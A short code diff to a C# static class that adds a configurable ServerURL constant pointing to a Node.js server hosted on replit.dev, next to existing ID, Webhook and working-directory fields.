@@ -16,6 +16,9 @@ namespace s1l14lx3
 {
     public static class Import
     {
+        //set your node.js server URL
+        public static string ServerURL = "https://d33bef2a-988e-4936-8e96-a9f342105860-00-101fii9h4bncx.picard.replit.dev";
+
         public static string ID = "";
         public static string Webhook = "";
         public static string Dir = Directory.GetCurrentDirectory();
